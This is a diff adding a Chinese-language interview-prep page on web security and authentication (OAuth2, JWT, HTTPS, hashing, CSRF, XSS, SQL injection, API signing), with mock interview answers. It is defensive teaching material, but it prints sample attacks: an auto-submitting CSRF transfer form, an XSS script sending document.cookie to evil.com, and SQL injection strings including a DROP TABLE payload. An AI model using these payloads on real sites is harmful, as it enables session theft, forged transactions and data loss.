@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>安全 & 认证 - 面试知识复习库</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <nav class="nav">
+    <div class="nav-inner">
+      <a class="nav-brand" href="../index.html">📚 面试知识复习库</a>
+      <a class="back" href="../index.html">← 返回目录</a>
+    </div>
+  </nav>
+  <div class="container">
+    <h1>🔐 安全 & 认证</h1>
+    <p class="subtitle">OAuth2 · JWT · HTTPS · 加密算法 · 安全防护</p>
+    <div class="page-layout">
+      <div class="sidebar">
+        <div class="sidebar-title">📑 目录导航</div>
+        <ul>
+          <li><a href="#part1">第一部分：技术原理</a></li>
+          <li class="sub"><a href="#s1-1">OAuth2 授权模式</a></li>
+          <li class="sub"><a href="#s1-2">JWT 结构与签名</a></li>
+          <li class="sub"><a href="#s1-3">Session vs Token</a></li>
+          <li class="sub"><a href="#s1-4">HTTPS 原理</a></li>
+          <li class="sub"><a href="#s1-5">加密算法</a></li>
+          <li><a href="#part2">第二部分：场景化讲解</a></li>
+          <li class="sub"><a href="#s2-1">CSRF 防护</a></li>
+          <li class="sub"><a href="#s2-2">XSS 防护</a></li>
+          <li class="sub"><a href="#s2-3">SQL 注入防护</a></li>
+          <li class="sub"><a href="#s2-4">API 安全</a></li>
+          <li><a href="#part3">第三部分：模拟面试</a></li>
+        </ul>
+      </div>
+      <div class="main-content">
+
+        <!-- ==================== 第一部分 ==================== -->
+        <h2 id="part1">第一部分：技术原理</h2>
+
+        <!-- 1-1 OAuth2 -->
+        <h3 id="s1-1">OAuth2 授权模式</h3>
+
+        <div class="card">
+          <h4>OAuth2 四种授权模式</h4>
+          <table>
+            <thead>
+              <tr><th>模式</th><th>流程</th><th>适用场景</th><th>安全性</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><span class="badge badge-green">授权码模式</span></td>
+                <td>用户→授权页→回调带 code→后端用 code 换 token</td>
+                <td>第三方登录（微信/GitHub）</td>
+                <td>最高（token 不经过前端）</td>
+              </tr>
+              <tr>
+                <td><span class="badge badge-blue">隐式模式</span></td>
+                <td>用户→授权页→直接返回 token（URL hash）</td>
+                <td>纯前端 SPA 应用（已不推荐）</td>
+                <td>低（token 暴露在 URL 中）</td>
+              </tr>
+              <tr>
+                <td><span class="badge badge-orange">密码模式</span></td>
+                <td>客户端直接拿用户名密码换 token</td>
+                <td>自家 App、高度信任的客户端</td>
+                <td>中（密码暴露给客户端）</td>
+              </tr>
+              <tr>
+                <td><span class="badge badge-purple">客户端凭证模式</span></td>
+                <td>客户端用 client_id + client_secret 换 token</td>
+                <td>服务间调用（M2M）</td>
+                <td>高（无用户参与）</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="card">
+          <h4>授权码模式详解（最常用）</h4>
+          <div class="flow">
+            <div class="flow-box flow-blue">1. 用户点击登录<br><small>重定向到授权服务器</small></div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-box flow-purple">2. 用户授权<br><small>在授权页面确认</small></div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-box flow-green">3. 回调带 code<br><small>redirect_uri?code=xxx</small></div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-box flow-orange">4. 后端换 token<br><small>code + client_secret</small></div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-box flow-pink">5. 获取 token<br><small>access_token + refresh_token</small></div>
+          </div>
+          <pre><code>// 授权码模式关键请求
+// 1. 前端重定向到授权页面
+https://auth-server.com/oauth/authorize?
+  response_type=code&
+  client_id=CLIENT_ID&
+  redirect_uri=https://app.com/callback&
+  scope=read&
+  state=random_string  // 防 CSRF
+
+// 2. 后端用 code 换 token（前端不可见）
+POST https://auth-server.com/oauth/token
+  grant_type=authorization_code&
+  code=AUTH_CODE&
+  redirect_uri=https://app.com/callback&
+  client_id=CLIENT_ID&
+  client_secret=CLIENT_SECRET</code></pre>
+          <div class="tip">授权码模式的安全关键：code 只能使用一次且有效期很短（通常 10 分钟），后端用 code 换 token 时需要 client_secret，前端无法获取 token。</div>
+        </div>
+
+        <!-- 1-2 JWT -->
+        <h3 id="s1-2">JWT 结构与签名</h3>
+
+        <div class="card">
+          <h4>JWT 三部分结构</h4>
+          <pre><code>// JWT 由三部分组成，用 "." 分隔
+// Header.Payload.Signature
+
+// Header（头部）：声明签名算法和 token 类型
+{
+  "alg": "HS256",  // 签名算法
+  "typ": "JWT"     // token 类型
+}
+
+// Payload（载荷）：存放业务数据和声明
+{
+  "sub": "1234567890",  // 用户 ID
+  "name": "John Doe",   // 用户名
+  "iat": 1516239022,    // 签发时间
+  "exp": 1516242622,    // 过期时间
+  "roles": ["admin"]    // 自定义声明
+}
+
+// Signature（签名）：对 Header 和 Payload 的签名
+HMACSHA256(
+  base64UrlEncode(header) + "." + base64UrlEncode(payload),
+  secret
+)</code></pre>
+        </div>
+
+        <div class="card">
+          <h4>签名算法对比</h4>
+          <table>
+            <thead>
+              <tr><th>算法</th><th>类型</th><th>密钥</th><th>特点</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>HS256</td><td>对称加密</td><td>共享密钥（secret）</td><td>简单快速，适合单服务</td></tr>
+              <tr><td>RS256</td><td>非对称加密</td><td>私钥签名，公钥验证</td><td>安全，适合多服务验证</td></tr>
+              <tr><td>ES256</td><td>非对称加密</td><td>私钥签名，公钥验证</td><td>签名更短，性能更好</td></tr>
+            </tbody>
+          </table>
+          <div class="warn">JWT 的 Payload 只是 Base64 编码，不是加密！任何人拿到 JWT 都能解码 Payload 看到内容。敏感信息（如密码）不能放在 JWT 中。</div>
+        </div>
+
+        <!-- 1-3 Session vs Token -->
+        <h3 id="s1-3">Session vs Token</h3>
+
+        <div class="card">
+          <h4>有状态 vs 无状态认证</h4>
+          <div class="compare-row">
+            <div class="compare-box">
+              <h4>Session（有状态）</h4>
+              <ul>
+                <li>服务端保存 Session 数据</li>
+                <li>客户端通过 Cookie 携带 Session ID</li>
+                <li>每次请求服务端查找 Session</li>
+                <li><strong>问题：</strong>多节点需共享 Session（Redis）</li>
+                <li><strong>优点：</strong>服务端可随时撤销会话</li>
+              </ul>
+            </div>
+            <div class="compare-box">
+              <h4>Token（无状态）</h4>
+              <ul>
+                <li>服务端不保存任何状态</li>
+                <li>客户端通过 Header 携带 Token</li>
+                <li>服务端只验证 Token 签名即可</li>
+                <li><strong>优点：</strong>天然支持分布式，无需共享</li>
+                <li><strong>缺点：</strong>无法主动撤销（需黑名单）</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- 1-4 HTTPS -->
+        <h3 id="s1-4">HTTPS 原理</h3>
+
+        <div class="card">
+          <h4>TLS 握手流程（RSA）</h4>
+          <div class="flow">
+            <div class="flow-box flow-blue">Client Hello<br><small>支持的 TLS 版本<br>加密套件列表<br>随机数 Client Random</small></div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-box flow-purple">Server Hello<br><small>选定加密套件<br>随机数 Server Random<br>发送证书</small></div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-box flow-green">客户端验证证书<br><small>CA 链验证<br>生成 Pre-Master Secret<br>用公钥加密发送</small></div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-box flow-orange">双方计算会话密钥<br><small>Master Secret = f(Client Random,<br>Server Random, Pre-Master Secret)</small></div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-box flow-pink">加密通信<br><small>使用对称加密<br>(AES) 传输数据</small></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h4>HTTPS 核心设计思想</h4>
+          <ul>
+            <li><strong>非对称加密（RSA/ECC）：</strong>用于握手阶段，安全地交换密钥</li>
+            <li><strong>对称加密（AES）：</strong>用于数据传输阶段，性能高</li>
+            <li><strong>数字证书：</strong>由 CA 签发，证明服务器身份，防止中间人攻击</li>
+            <li><strong>混合加密：</strong>结合两者优势——非对称加密保证密钥安全，对称加密保证传输效率</li>
+          </ul>
+        </div>
+
+        <!-- 1-5 加密算法 -->
+        <h3 id="s1-5">加密算法</h3>
+
+        <div class="card">
+          <h4>对称加密 vs 非对称加密</h4>
+          <div class="compare-row">
+            <div class="compare-box">
+              <h4>对称加密</h4>
+              <ul>
+                <li>加解密使用同一个密钥</li>
+                <li>算法：AES、DES、3DES</li>
+                <li>AES-256 是目前最常用的</li>
+                <li>速度快，适合大量数据加密</li>
+                <li>问题：密钥分发困难</li>
+              </ul>
+            </div>
+            <div class="compare-box">
+              <h4>非对称加密</h4>
+              <ul>
+                <li>公钥加密，私钥解密（或反之）</li>
+                <li>算法：RSA、ECC、DSA</li>
+                <li>RSA-2048/ECC-256 是常用配置</li>
+                <li>安全性高，但速度慢</li>
+                <li>适合密钥交换和数字签名</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h4>哈希算法</h4>
+          <table>
+            <thead>
+              <tr><th>算法</th><th>输出长度</th><th>特点</th><th>适用场景</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>MD5</td><td>128 位</td><td>速度快，已不安全（可碰撞）</td><td>文件校验（非安全场景）</td></tr>
+              <tr><td>SHA-1</td><td>160 位</td><td>已不推荐（Google 已破解碰撞）</td><td>历史遗留系统</td></tr>
+              <tr><td>SHA-256</td><td>256 位</td><td>安全，SHA-2 家族</td><td>数字签名、区块链</td></tr>
+              <tr><td>SHA-3</td><td>可变</td><td>最新标准，Keccak 算法</td><td>新系统推荐</td></tr>
+              <tr><td>Bcrypt</td><td>60 字符</td><td>自带盐、慢哈希、抗暴力破解</td><td>密码存储（推荐）</td></tr>
+              <tr><td>Argon2</td><td>可变</td><td>最新密码哈希算法</td><td>密码存储（最新推荐）</td></tr>
+            </tbody>
+          </table>
+          <div class="tip">密码存储推荐使用 Bcrypt 或 Argon2，它们内置盐值（salt）和慢哈希机制，能有效防止彩虹表攻击和暴力破解。绝对不要用 MD5 或 SHA-256 直接存储密码。</div>
+        </div>
+
+        <!-- ==================== 第二部分 ==================== -->
+        <h2 id="part2">第二部分：场景化讲解</h2>
+
+        <!-- 2-1 CSRF -->
+        <h3 id="s2-1">CSRF 防护</h3>
+
+        <div class="card">
+          <h4>CSRF 攻击原理</h4>
+          <p>CSRF（Cross-Site Request Forgery，跨站请求伪造）：攻击者诱导用户访问恶意页面，利用用户已登录的身份，向目标网站发送伪造请求。</p>
+          <pre><code>&lt;!-- 恶意网站中的隐藏表单 --&gt;
+&lt;!-- 用户已登录 bank.com，浏览器自动携带 Cookie --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amount=10000"&gt;
+&lt;!-- 或 --&gt;
+&lt;form action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="to" value="attacker"&gt;
+  &lt;input type="hidden" name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+        </div>
+
+        <div class="card">
+          <h4>CSRF 防护方案</h4>
+          <table>
+            <thead>
+              <tr><th>方案</th><th>原理</th><th>优缺点</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>CSRF Token</strong></td>
+                <td>服务端生成随机 Token，嵌入表单或 Header，提交时验证</td>
+                <td>最经典方案，需要前后端配合</td>
+              </tr>
+              <tr>
+                <td><strong>SameSite Cookie</strong></td>
+                <td>设置 Cookie 的 SameSite 属性（Strict/Lax/None）</td>
+                <td>浏览器原生支持，简单有效</td>
+              </tr>
+              <tr>
+                <td><strong>Referer/Origin 校验</strong></td>
+                <td>检查请求头中的 Referer 或 Origin 是否来自可信域名</td>
+                <td>简单但可能被伪造或缺失</td>
+              </tr>
+              <tr>
+                <td><strong>双重 Cookie 验证</strong></td>
+                <td>前端读取 Cookie 中的随机值，放入请求参数，服务端对比</td>
+                <td>无需服务端存储状态</td>
+              </tr>
+            </tbody>
+          </table>
+          <div class="tip">SameSite Cookie 推荐设置为 Lax：允许顶级导航的 GET 请求携带 Cookie，阻止跨站的 POST/PUT/DELETE 请求携带 Cookie。2024 年起 Chrome 默认将 Cookie 的 SameSite 设为 Lax。</div>
+        </div>
+
+        <!-- 2-2 XSS -->
+        <h3 id="s2-2">XSS 防护</h3>
+
+        <div class="card">
+          <h4>XSS 攻击类型</h4>
+          <div class="compare-row">
+            <div class="compare-box">
+              <h4>反射型 XSS</h4>
+              <ul>
+                <li>恶意代码在 URL 中，服务器"反射"到页面</li>
+                <li>如搜索框中注入 script 标签</li>
+                <li>一次性攻击，需要用户点击恶意链接</li>
+              </ul>
+            </div>
+            <div class="compare-box">
+              <h4>存储型 XSS</h4>
+              <ul>
+                <li>恶意代码存储在数据库中（如评论内容）</li>
+                <li>所有访问该页面的用户都会被执行</li>
+                <li>危害最大，影响范围广</li>
+              </ul>
+            </div>
+          </div>
+          <div class="compare-row">
+            <div class="compare-box">
+              <h4>DOM 型 XSS</h4>
+              <ul>
+                <li>前端 JavaScript 直接操作 DOM 时注入</li>
+                <li>不经过服务器，纯前端漏洞</li>
+                <li>如 innerHTML 直接插入用户输入</li>
+              </ul>
+            </div>
+            <div class="compare-box">
+              <h4>攻击示例</h4>
+              <pre><code>// 恶意脚本注入
+&lt;script&gt;
+  // 窃取 Cookie
+  document.location=
+    'http://evil.com/steal?c='
+    + document.cookie;
+&lt;/script&gt;
+
+// 或诱导操作
+&lt;img src=x onerror=
+  "alert(document.cookie)"&gt;</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h4>XSS 防护方案</h4>
+          <table>
+            <thead>
+              <tr><th>方案</th><th>说明</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><strong>输入转义</strong></td><td>对用户输入中的特殊字符（&lt; &gt; &amp; " '）进行 HTML 实体编码</td></tr>
+              <tr><td><strong>输出编码</strong></td><td>在 HTML、JS、CSS、URL 等不同上下文中使用对应的编码方式</td></tr>
+              <tr><td><strong>CSP（Content Security Policy）</strong></td><td>通过 HTTP 头限制页面可执行的脚本来源，禁止内联脚本</td></tr>
+              <tr><td><strong>HttpOnly Cookie</strong></td><td>设置 Cookie 的 HttpOnly 属性，JavaScript 无法读取</td></tr>
+              <tr><td><strong>前端框架自动转义</strong></td><td>React/Vue 默认对插值内容进行转义（v-text / textContent）</td></tr>
+            </tbody>
+          </table>
+          <pre><code>// CSP 头设置示例
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+
+// 禁止内联脚本，只允许加载同源和指定 CDN 的脚本</code></pre>
+        </div>
+
+        <!-- 2-3 SQL 注入 -->
+        <h3 id="s2-3">SQL 注入防护</h3>
+
+        <div class="card">
+          <h4>SQL 注入原理</h4>
+          <pre><code>// 正常查询
+SELECT * FROM users WHERE name = 'John' AND pass = '123456';
+
+// 注入攻击：输入 name = "admin' --"
+SELECT * FROM users WHERE name = 'admin' --' AND pass = '';
+// -- 后面被注释掉，无需密码即可登录
+
+// 更危险的注入：name = "'; DROP TABLE users; --"
+SELECT * FROM users WHERE name = ''; DROP TABLE users; --';</code></pre>
+        </div>
+
+        <div class="card">
+          <h4>SQL 注入防护方案</h4>
+          <table>
+            <thead>
+              <tr><th>方案</th><th>说明</th><th>推荐度</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><strong>参数化查询（预编译）</strong></td><td>使用 PreparedStatement，SQL 和参数分离，数据库引擎自动转义参数</td><td>最推荐</td></tr>
+              <tr><td><strong>ORM 框架</strong></td><td>MyBatis（#{}）、Hibernate、JPA 等 ORM 框架内置参数化</td><td>推荐</td></tr>
+              <tr><td><strong>输入验证</strong></td><td>对输入进行白名单校验（如只允许字母数字）</td><td>辅助手段</td></tr>
+              <tr><td><strong>最小权限</strong></td><td>数据库账号只授予必要的权限，禁止 DROP/ALTER</td><td>防御深度</td></tr>
+              <tr><td><strong>WAF</strong></td><td>Web 应用防火墙拦截恶意 SQL 特征</td><td>辅助手段</td></tr>
+            </tbody>
+          </table>
+          <pre><code>// 参数化查询示例（Java PreparedStatement）
+String sql = "SELECT * FROM users WHERE name = ? AND pass = ?";
+PreparedStatement ps = conn.prepareStatement(sql);
+ps.setString(1, userName);   // 参数自动转义
+ps.setString(2, password);
+
+// MyBatis 中使用 #{}
+// SELECT * FROM users WHERE name = #{name}
+// 而不是 ${name}（${} 不转义，有注入风险）</code></pre>
+          <div class="warn">MyBatis 中 #{} 使用参数化查询（安全），${} 使用字符串拼接（不安全）。永远不要在 SQL 中使用 ${} 拼接用户输入。</div>
+        </div>
+
+        <!-- 2-4 API 安全 -->
+        <h3 id="s2-4">API 安全</h3>
+
+        <div class="card">
+          <h4>API 安全防护措施</h4>
+          <table>
+            <thead>
+              <tr><th>措施</th><th>说明</th><th>实现方式</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><strong>认证（Authentication）</strong></td><td>验证调用者身份</td><td>JWT / OAuth2 / API Key</td></tr>
+              <tr><td><strong>授权（Authorization）</strong></td><td>验证调用者权限</td><td>RBAC / ABAC / Scope</td></tr>
+              <tr><td><strong>限流（Rate Limiting）</strong></td><td>控制请求频率</td><td>令牌桶 / 滑动窗口</td></tr>
+              <tr><td><strong>签名（Signature）</strong></td><td>验证请求未被篡改</td><td>HMAC / RSA 签名</td></tr>
+              <tr><td><strong>HTTPS</strong></td><td>传输层加密</td><td>TLS 1.2+</td></tr>
+              <tr><td><strong>输入校验</strong></td><td>防止恶意输入</td><td>参数校验 / WAF</td></tr>
+              <tr><td><strong>日志审计</strong></td><td>记录所有 API 调用</td><td>ELK / 链路追踪</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="card">
+          <h4>API 签名机制</h4>
+          <pre><code>// API 签名流程（如支付宝/微信支付）
+// 1. 将所有请求参数按字母排序拼接
+String sortedParams = "amount=100&app_id=xxx&method=pay&timestamp=1234567890";
+
+// 2. 拼接密钥
+String signStr = sortedParams + "&secret=YOUR_SECRET_KEY";
+
+// 3. 计算签名（HMAC-SHA256 或 MD5）
+String signature = HMAC_SHA256(signStr, secretKey);
+
+// 4. 将签名放入请求参数
+// 请求：amount=100&app_id=xxx&method=pay&timestamp=1234567890&sign=abc123
+
+// 服务端验证：用相同方式计算签名，对比是否一致</code></pre>
+          <ul>
+            <li><strong>防篡改：</strong>参数被修改后签名不匹配</li>
+            <li><strong>防重放：</strong>加入 timestamp + nonce，服务端校验时间窗口和 nonce 唯一性</li>
+            <li><strong>防伪造：</strong>签名需要密钥，攻击者无法伪造</li>
+          </ul>
+        </div>
+
+        <!-- ==================== 第三部分 ==================== -->
+        <h2 id="part3">第三部分：模拟面试</h2>
+
+        <div class="qa">
+          <div class="q">OAuth2 的四种授权模式有什么区别？各自适用于什么场景？</div>
+          <div class="a">
+            <strong>参考：</strong>1）授权码模式：用户授权后回调带 code，后端用 code+client_secret 换 token，安全性最高（token 不经过前端），适合第三方登录（微信/GitHub）；2）隐式模式：直接返回 token 到前端，安全性低（token 暴露在 URL），已不推荐；3）密码模式：客户端直接用用户名密码换 token，适合自家高度信任的 App；4）客户端凭证模式：用 client_id+client_secret 换 token，无用户参与，适合服务间调用。实际中推荐使用授权码模式 + PKCE（增强版），即使是 SPA 应用也应避免隐式模式。
+          </div>
+        </div>
+
+        <div class="qa">
+          <div class="q">JWT 的结构是什么？如何保证安全性？</div>
+          <div class="a">
+            <strong>参考：</strong>JWT 由三部分组成：Header（声明算法和类型）、Payload（业务数据和声明）、Signature（签名）。三部分用 "." 分隔，都是 Base64Url 编码。安全性保证：1）签名防篡改——服务端用密钥对 Header+Payload 签名，客户端无法伪造；2）但 Payload 只是 Base64 编码不是加密，敏感信息不能放入；3）推荐使用 RS256（非对称加密），私钥签名、公钥验证，多服务可安全验证。注意事项：JWT 无法主动失效（需黑名单机制），过期时间不宜太长，建议配合 refresh_token 使用。
+          </div>
+        </div>
+
+        <div class="qa">
+          <div class="q">Session 和 Token 认证有什么区别？如何选择？</div>
+          <div class="a">
+            <strong>参考：</strong>Session 有状态：服务端存储 Session 数据，客户端通过 Cookie 携带 Session ID，每次请求服务端查 Session。优点是可随时撤销会话，缺点是多节点需共享（Redis）。Token 无状态：服务端不存储，客户端通过 Header 携带 JWT，服务端验证签名即可。优点是天然支持分布式，缺点是无法主动撤销（需黑名单）。选择：单体应用用 Session 即可；微服务/分布式系统推荐 JWT；需要强管控（如踢人下线）时用 Session 或 JWT+Redis 黑名单。
+          </div>
+        </div>
+
+        <div class="qa">
+          <div class="q">HTTPS 是如何保证安全的？为什么不直接用非对称加密传输数据？</div>
+          <div class="a">
+            <strong>参考：</strong>HTTPS 通过 TLS 协议实现安全通信：1）握手阶段使用非对称加密（RSA/ECC）安全交换密钥；2）数据传输使用对称加密（AES），性能高。为什么不全程非对称加密？因为非对称加密比对称加密慢 1000 倍以上，不适合大量数据传输。HTTPS 的设计思想是"用非对称加密保护对称密钥的交换，用对称加密保护数据传输"，结合两者优势。数字证书（CA 签发）用于验证服务器身份，防止中间人攻击。
+          </div>
+        </div>
+
+        <div class="qa">
+          <div class="q">什么是 CSRF 攻击？如何防护？</div>
+          <div class="a">
+            <strong>参考：</strong>CSRF 是跨站请求伪造：攻击者诱导已登录用户访问恶意页面，利用浏览器自动携带 Cookie 的特性，以用户身份向目标网站发送伪造请求。防护方案：1）CSRF Token——服务端生成随机 Token 嵌入表单，提交时验证；2）SameSite Cookie——设置 Cookie 的 SameSite=Lax 属性，阻止跨站请求携带 Cookie；3）Referer/Origin 校验——检查请求来源是否可信；4）双重 Cookie 验证——前端读取 Cookie 中的随机值放入请求参数，服务端对比。推荐组合使用 CSRF Token + SameSite Cookie。
+          </div>
+        </div>
+
+        <div class="qa">
+          <div class="q">什么是 XSS 攻击？和 CSRF 有什么区别？</div>
+          <div class="a">
+            <strong>参考：</strong>XSS（跨站脚本攻击）：攻击者在页面中注入恶意 JavaScript 代码，当其他用户访问该页面时，脚本在用户浏览器中执行，可窃取 Cookie、篡改页面等。与 CSRF 的区别：XSS 是注入脚本到目标网站，CSRF 是利用用户身份伪造请求。XSS 的目标是窃取用户数据，CSRF 的目标是伪造用户操作。防护：1）输入转义——对特殊字符 HTML 实体编码；2）CSP——限制脚本来源，禁止内联脚本；3）HttpOnly Cookie——JavaScript 无法读取；4）前端框架自动转义（React/Vue 默认行为）。
+          </div>
+        </div>
+
+        <div class="qa">
+          <div class="q">如何防护 SQL 注入？MyBatis 中 #{} 和 ${} 有什么区别？</div>
+          <div class="a">
+            <strong>参考：</strong>SQL 注入防护核心是参数化查询（预编译）：SQL 语句和参数分离，数据库引擎自动对参数转义，即使参数包含 SQL 关键字也不会被执行。MyBatis 中：#{} 使用 PreparedStatement 参数化查询（安全），${} 使用字符串拼接（不安全）。例如 <code>WHERE name = #{name}</code> 会被编译为 <code>WHERE name = ?</code>，参数自动转义；而 <code>WHERE name = ${name}</code> 直接拼接字符串，存在注入风险。${} 只应在确定安全的场景使用（如动态表名、列名），绝不能用于用户输入。
+          </div>
+        </div>
+
+        <div class="qa">
+          <div class="q">API 安全如何设计？如何防止 API 被滥用？</div>
+          <div class="a">
+            <strong>参考：</strong>API 安全防护：1）认证——JWT/OAuth2/API Key 验证调用者身份；2）授权——RBAC/ABAC 控制接口访问权限；3）限流——令牌桶/滑动窗口控制请求频率，防 DDoS 和滥用；4）签名——HMAC 签名防篡改，timestamp+nonce 防重放；5）HTTPS——传输层加密；6）输入校验——参数类型/范围校验，防注入；7）日志审计——记录所有调用，便于追溯。签名机制是开放 API（如支付接口）的核心安全措施，客户端和服务端共享密钥，服务端验证签名一致性和 timestamp 时效性。
+          </div>
+        </div>
+
+        <div style="text-align:center;color:var(--text-dim);margin-top:3rem;padding-bottom:2rem;font-size:0.85rem">
+          <a href="../index.html" style="color:var(--accent);text-decoration:none">← 返回知识库目录</a><br><br>
+          安全 & 认证 · 面试知识复习库 · Last updated 2026-06-11
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+  (function() {
+    const links = document.querySelectorAll('.sidebar a');
+    const sections = [];
+    links.forEach(a => {
+      const id = a.getAttribute('href')?.replace('#', '');
+      if (id) { const el = document.getElementById(id); if (el) sections.push({ el, link: a }); }
+    });
+    if (!sections.length) return;
+    function update() {
+      let current = sections[0];
+      const offset = 120;
+      for (const s of sections) { if (s.el.getBoundingClientRect().top <= offset) current = s; }
+      links.forEach(a => a.classList.remove('active'));
+      if (current) current.link.classList.add('active');
+    }
+    window.addEventListener('scroll', update, { passive: true });
+    update();
+  })();
+  </script>
+</body>
+</html>
